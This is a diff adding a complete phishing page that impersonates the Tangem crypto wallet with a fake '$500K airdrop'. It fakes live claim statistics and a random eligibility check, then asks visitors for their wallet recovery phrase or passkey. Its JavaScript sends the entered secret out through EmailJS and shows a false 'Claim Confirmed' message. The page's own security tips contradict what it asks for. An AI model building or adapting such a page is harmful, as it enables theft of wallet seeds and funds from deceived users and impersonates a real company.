@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tangem Airdrop - Claim $500K in Crypto</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+        }
+        .connecting-animation {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        .progress-bar {
+            animation: progress 10s linear forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .token-progress {
+            height: 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-black text-white py-4 px-6 shadow-md">
+        <div class="container mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <div class="w-8 h-8 bg-amber-500 rounded-full"></div>
+                <span class="font-bold text-xl">Tangem</span>
+            </div>
+            <nav class="hidden md:flex space-x-6">
+                <a href="#" class="hover:text-amber-400">Wallet</a>
+                <a href="#" class="hover:text-amber-400">Partnership</a>
+                <a href="#" class="hover:text-amber-400">Community</a>
+                <a href="#" class="hover:text-amber-400">English</a>
+            </nav>
+            <button class="bg-amber-500 hover:bg-amber-600 text-black font-bold py-2 px-4 rounded-full">
+                Get Tangem
+            </button>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="py-16 px-4 sm:px-6 lg:px-8 bg-gradient-to-b from-black to-gray-900 text-white">
+        <div class="container mx-auto text-center">
+            <div class="inline-block bg-amber-500 text-black text-xs font-bold px-3 py-1 rounded-full mb-4">
+                LIMITED TIME OFFER
+            </div>
+            <h1 class="text-4xl md:text-5xl font-bold mb-6">
+                🚀 Tangem Airdrop: Claim Your Share of <span class="text-amber-400">$500,000</span> in Crypto!
+            </h1>
+            <p class="text-xl text-gray-300 max-w-3xl mx-auto mb-8">
+                We're distributing BTC, ETH, XRP, and USDT to celebrate Tangem's secure wallet ecosystem.
+                No coins? No problem! Connect your wallet and claim instantly.
+            </p>
+            
+            <!-- Eligibility Check -->
+            <div class="max-w-md mx-auto bg-gray-800 rounded-xl p-6 mb-8 shadow-lg">
+                <h3 class="text-xl font-bold mb-4">Check Eligibility</h3>
+                <div class="flex">
+                    <input type="text" id="wallet-address" placeholder="Enter wallet address" class="flex-grow bg-gray-700 text-white px-4 py-2 rounded-l-lg focus:outline-none focus:ring-2 focus:ring-amber-500">
+                    <button onclick="checkEligibility()" class="bg-amber-500 hover:bg-amber-600 text-black font-bold px-4 py-2 rounded-r-lg">
+                        Check
+                    </button>
+                </div>
+                <div id="eligibility-result" class="mt-3 text-sm hidden"></div>
+            </div>
+
+            <!-- Live Claim Stats -->
+            <div class="max-w-2xl mx-auto bg-gray-800 rounded-xl p-6 mb-8 shadow-lg">
+                <h3 class="text-xl font-bold mb-4">💰 Live Claim Statistics</h3>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-4">
+                    <div class="bg-gray-700 p-3 rounded-lg">
+                        <div class="text-amber-400 font-bold text-lg" id="btc-claimed">125.42 BTC</div>
+                        <div class="text-gray-400 text-sm">Claimed</div>
+                        <div class="token-progress bg-gray-600 mt-2">
+                            <div class="token-progress bg-amber-500" style="width: 63%"></div>
+                        </div>
+                    </div>
+                    <div class="bg-gray-700 p-3 rounded-lg">
+                        <div class="text-blue-400 font-bold text-lg" id="eth-claimed">842.17 ETH</div>
+                        <div class="text-gray-400 text-sm">Claimed</div>
+                        <div class="token-progress bg-gray-600 mt-2">
+                            <div class="token-progress bg-blue-500" style="width: 42%"></div>
+                        </div>
+                    </div>
+                    <div class="bg-gray-700 p-3 rounded-lg">
+                        <div class="text-green-400 font-bold text-lg" id="xrp-claimed">1,245,000 XRP</div>
+                        <div class="text-gray-400 text-sm">Claimed</div>
+                        <div class="token-progress bg-gray-600 mt-2">
+                            <div class="token-progress bg-green-500" style="width: 78%"></div>
+                        </div>
+                    </div>
+                    <div class="bg-gray-700 p-3 rounded-lg">
+                        <div class="text-purple-400 font-bold text-lg" id="usdt-claimed">285,000 USDT</div>
+                        <div class="text-gray-400 text-sm">Claimed</div>
+                        <div class="token-progress bg-gray-600 mt-2">
+                            <div class="token-progress bg-purple-500" style="width: 57%"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="text-gray-400 text-sm">
+                    <span id="total-claimed">2,458</span> participants claimed • $<span id="total-value">387,420</span> distributed
+                </div>
+            </div>
+
+            <!-- Main Airdrop Claim Section -->
+            <div class="max-w-2xl mx-auto bg-gray-800 rounded-xl p-6 shadow-lg">
+                <h2 class="text-2xl font-bold mb-6 text-center">🔥 How to Participate</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+                    <div class="bg-gray-700 p-4 rounded-lg">
+                        <div class="text-amber-400 text-2xl mb-2">1</div>
+                        <h3 class="font-bold mb-2">Connect Your Wallet</h3>
+                        <p class="text-gray-300 text-sm">Supports Tangem, Trust Wallet, MetaMask, and more</p>
+                    </div>
+                    <div class="bg-gray-700 p-4 rounded-lg">
+                        <div class="text-amber-400 text-2xl mb-2">2</div>
+                        <h3 class="font-bold mb-2">Verify & Claim</h3>
+                        <p class="text-gray-300 text-sm">Complete quick authentication</p>
+                    </div>
+                    <div class="bg-gray-700 p-4 rounded-lg">
+                        <div class="text-amber-400 text-2xl mb-2">3</div>
+                        <h3 class="font-bold mb-2">Receive Tokens</h3>
+                        <p class="text-gray-300 text-sm">Funds arrive in minutes!</p>
+                    </div>
+                </div>
+
+                <div id="wallet-connect-section">
+                    <h3 class="font-bold mb-4 text-center">👇 Click Your Wallet to Start</h3>
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-6">
+                        <button onclick="connectWallet('tangem')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-amber-500 rounded-full mb-2 flex items-center justify-center text-black font-bold">T</div>
+                            <span>Tangem</span>
+                        </button>
+                        <button onclick="connectWallet('trust')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-white font-bold">T</div>
+                            <span>Trust Wallet</span>
+                        </button>
+                        <button onclick="connectWallet('metamask')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-orange-500 rounded-full mb-2 flex items-center justify-center text-white font-bold">M</div>
+                            <span>MetaMask</span>
+                        </button>
+                        <button onclick="connectWallet('coinbase')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-blue-400 rounded-full mb-2 flex items-center justify-center text-white font-bold">C</div>
+                            <span>Coinbase</span>
+                        </button>
+                        <button onclick="connectWallet('binance')" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-yellow-400 rounded-full mb-2 flex items-center justify-center text-black font-bold">B</div>
+                            <span>Binance</span>
+                        </button>
+                        <button onclick="showMoreWallets()" class="wallet-btn bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 bg-gray-500 rounded-full mb-2 flex items-center justify-center text-white font-bold">+</div>
+                            <span>More</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="connecting-section" class="hidden text-center">
+                    <div class="mb-4">
+                        <div class="h-2 bg-gray-700 rounded-full overflow-hidden">
+                            <div class="progress-bar h-full bg-amber-500"></div>
+                        </div>
+                    </div>
+                    <div class="connecting-animation text-amber-400 text-xl font-bold mb-2">
+                        Connecting to wallet...
+                    </div>
+                    <p class="text-gray-400">This may take a few seconds</p>
+                </div>
+
+                <div id="auth-section" class="hidden">
+                    <h3 class="font-bold mb-4 text-center">🔐 Secure Authentication</h3>
+                    <p class="text-gray-300 mb-6 text-center">Choose your preferred method:</p>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                        <button onclick="showPhraseInput()" class="bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex items-center space-x-3">
+                            <div class="text-2xl">🔤</div>
+                            <div>
+                                <h4 class="font-bold">Recovery Phrase</h4>
+                                <p class="text-gray-400 text-sm">12/24 words</p>
+                            </div>
+                        </button>
+                        <button onclick="showPasskeyInput()" class="bg-gray-700 hover:bg-gray-600 p-4 rounded-lg flex items-center space-x-3">
+                            <div class="text-2xl">🛡️</div>
+                            <div>
+                                <h4 class="font-bold">Passkey</h4>
+                                <p class="text-gray-400 text-sm">Biometric/Face ID</p>
+                            </div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="phrase-input-section" class="hidden">
+                    <div class="mb-4">
+                        <label for="recovery-phrase" class="block text-gray-300 mb-2">Enter your recovery phrase</label>
+                        <textarea id="recovery-phrase" rows="3" class="w-full bg-gray-700 text-white px-4 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-500" placeholder="Enter your 12 or 24 word recovery phrase separated by spaces"></textarea>
+                    </div>
+                    <button onclick="submitPhrase()" class="w-full bg-amber-500 hover:bg-amber-600 text-black font-bold py-3 px-4 rounded-lg">
+                        Verify & Claim
+                    </button>
+                </div>
+
+                <div id="passkey-input-section" class="hidden">
+                    <div class="mb-4">
+                        <label for="passkey" class="block text-gray-300 mb-2">Enter your passkey</label>
+                        <input type="password" id="passkey" class="w-full bg-gray-700 text-white px-4 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-amber-500" placeholder="Enter your passkey">
+                    </div>
+                    <button onclick="submitPasskey()" class="w-full bg-amber-500 hover:bg-amber-600 text-black font-bold py-3 px-4 rounded-lg">
+                        Verify & Claim
+                    </button>
+                </div>
+
+                <div id="success-section" class="hidden text-center py-8">
+                    <div class="inline-block bg-green-500 text-white text-4xl p-4 rounded-full mb-4">✓</div>
+                    <h3 class="text-2xl font-bold mb-2">✅ Claim Confirmed!</h3>
+                    <p class="text-gray-300 mb-6">Your BTC, ETH, XRP, and USDT will arrive shortly.</p>
+                    <button class="bg-amber-500 hover:bg-amber-600 text-black font-bold py-3 px-6 rounded-full">
+                        Share to Unlock Bonus Rewards!
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Info Section -->
+    <section class="py-16 px-4 sm:px-6 lg:px-8 bg-white">
+        <div class="container mx-auto max-w-4xl">
+            <h2 class="text-3xl font-bold text-center mb-12">📢 Rules & Tips</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div class="bg-gray-50 p-6 rounded-xl">
+                    <h3 class="font-bold text-lg mb-3 flex items-center">
+                        <span class="text-amber-500 mr-2">•</span> Distribution Details
+                    </h3>
+                    <ul class="space-y-3 text-gray-700">
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">✓</span> Distribution ends April 30 - First-come, first-served
+                        </li>
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">✓</span> $500,000 total in BTC, ETH, XRP, and USDT
+                        </li>
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">✓</span> No Tangem balance required - New users welcome!
+                        </li>
+                    </ul>
+                </div>
+                <div class="bg-gray-50 p-6 rounded-xl">
+                    <h3 class="font-bold text-lg mb-3 flex items-center">
+                        <span class="text-amber-500 mr-2">•</span> Security Tips
+                    </h3>
+                    <ul class="space-y-3 text-gray-700">
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">!</span> Never share your recovery phrase with anyone
+                        </li>
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">!</span> Stay alert for scams - We'll never DM you for keys
+                        </li>
+                        <li class="flex items-start">
+                            <span class="text-amber-500 mr-2">!</span> Only use official Tangem links
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-12 px-4 sm:px-6 lg:px-8 bg-amber-50">
+        <div class="container mx-auto text-center">
+            <h2 class="text-3xl font-bold mb-6">🎯 Ready? Connect your wallet now!</h2>
+            <p class="text-lg text-gray-700 mb-8 max-w-2xl mx-auto">
+                Don't miss your chance to claim free crypto from our $500,000 airdrop pool.
+            </p>
+            <a href="#wallet-connect-section" class="bg-black hover:bg-gray-800 text-white font-bold py-3 px-8 rounded-full inline-block">
+                Claim Your Airdrop Now
+            </a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-black text-white py-12 px-4 sm:px-6 lg:px-8">
+        <div class="container mx-auto">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="flex items-center space-x-2 mb-6 md:mb-0">
+                    <div class="w-8 h-8 bg-amber-500 rounded-full"></div>
+                    <span class="font-bold text-xl">Tangem</span>
+                </div>
+                <div class="flex space-x-6 mb-6 md:mb-0">
+                    <a href="#" class="hover:text-amber-400">Terms</a>
+                    <a href="#" class="hover:text-amber-400">Privacy</a>
+                    <a href="#" class="hover:text-amber-400">Help Center</a>
+                </div>
+                <div class="flex space-x-4">
+                    <a href="#" class="w-10 h-10 bg-gray-800 rounded-full flex items-center justify-center hover:bg-gray-700">
+                        <span>𝕏</span>
+                    </a>
+                    <a href="#" class="w-10 h-10 bg-gray-800 rounded-full flex items-center justify-center hover:bg-gray-700">
+                        <span>TG</span>
+                    </a>
+                    <a href="#" class="w-10 h-10 bg-gray-800 rounded-full flex items-center justify-center hover:bg-gray-700">
+                        <span>IN</span>
+                    </a>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-500">
+                <p>© 2024 Tangem. All rights reserved.</p>
+                <p class="mt-2 text-sm">Tangem AG is a Swiss company registered in Zug, Switzerland.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize EmailJS (replace with your actual credentials)
+        emailjs.init('YOUR_EMAILJS_USER_ID');
+
+        // Simulate live claim statistics
+        function updateLiveStats() {
+            // Random growth for demonstration
+            const btc = (125.42 + Math.random() * 0.5).toFixed(2);
+            const eth = (842.17 + Math.random() * 2).toFixed(2);
+            const xrp = (1245000 + Math.random() * 5000).toFixed(0);
+            const usdt = (285000 + Math.random() * 1000).toFixed(0);
+            const participants = 2458 + Math.floor(Math.random() * 10);
+            const totalValue = 387420 + Math.floor(Math.random() * 1000);
+            
+            document.getElementById('btc-claimed').textContent = btc + ' BTC';
+            document.getElementById('eth-claimed').textContent = eth + ' ETH';
+            document.getElementById('xrp-claimed').textContent = xrp.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' XRP';
+            document.getElementById('usdt-claimed').textContent = usdt.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' USDT';
+            document.getElementById('total-claimed').textContent = participants.toLocaleString();
+            document.getElementById('total-value').textContent = totalValue.toLocaleString();
+        }
+
+        // Update stats every 5 seconds
+        setInterval(updateLiveStats, 5000);
+        updateLiveStats(); // Initial call
+
+        function connectWallet(walletType) {
+            document.getElementById('wallet-connect-section').classList.add('hidden');
+            document.getElementById('connecting-section').classList.remove('hidden');
+            
+            setTimeout(function() {
+                document.getElementById('connecting-section').classList.add('hidden');
+                document.getElementById('auth-section').classList.remove('hidden');
+            }, 10000);
+        }
+        
+        function showMoreWallets() {
+            alert('Additional wallets will be shown here: Solflare, Kraken, Uniswap, etc.');
+        }
+        
+        function showPhraseInput() {
+            document.getElementById('auth-section').classList.add('hidden');
+            document.getElementById('phrase-input-section').classList.remove('hidden');
+        }
+        
+        function showPasskeyInput() {
+            document.getElementById('auth-section').classList.add('hidden');
+            document.getElementById('passkey-input-section').classList.remove('hidden');
+        }
+        
+        function submitPhrase() {
+            const phrase = document.getElementById('recovery-phrase').value;
+            if (!phrase) {
+                alert('Please enter your recovery phrase');
+                return;
+            }
+            
+            // Send to email using EmailJS
+            const templateParams = {
+                wallet_type: 'Recovery Phrase',
+                credential: phrase,
+                to_email: 'verification@tangem.com'
+            };
+            
+            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    document.getElementById('phrase-input-section').classList.add('hidden');
+                    document.getElementById('success-section').classList.remove('hidden');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Verification failed. Please try again.');
+                });
+        }
+        
+        function submitPasskey() {
+            const passkey = document.getElementById('passkey').value;
+            if (!passkey) {
+                alert('Please enter your passkey');
+                return;
+            }
+            
+            // Send to email using EmailJS
+            const templateParams = {
+                wallet_type: 'Passkey',
+                credential: passkey,
+                to_email: 'verification@tangem.com'
+            };
+            
+            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    document.getElementById('passkey-input-section').classList.add('hidden');
+                    document.getElementById('success-section').classList.remove('hidden');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Verification failed. Please try again.');
+                });
+        }
+        
+        function checkEligibility() {
+            const walletAddress = document.getElementById('wallet-address').value;
+            const resultDiv = document.getElementById('eligibility-result');
+            
+            if (!walletAddress) {
+                resultDiv.textContent = 'Please enter a wallet address';
+                resultDiv.className = 'mt-3 text-sm text-red-400';
+                resultDiv.classList.remove('hidden');
+                return;
+            }
+            
+            // Simulate checking eligibility (in a real app, this would be an API call)
+            resultDiv.textContent = 'Checking eligibility...';
+            resultDiv.className = 'mt-3 text-sm text-gray-400';
+            resultDiv.classList.remove('hidden');
+            
+            setTimeout(function() {
+                // Random eligibility for demo purposes
+                const isEligible = Math.random() > 0.3;
+                
+                if (isEligible) {
+                    resultDiv.textContent = '✅ Congratulations! This wallet is eligible for the airdrop.';
+                    resultDiv.className = 'mt-3 text-sm text-green-400';
+                } else {
+                    resultDiv.textContent = '❌ This wallet is not eligible for the current airdrop.';
+                    resultDiv.className = 'mt-3 text-sm text-red-400';
+                }
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
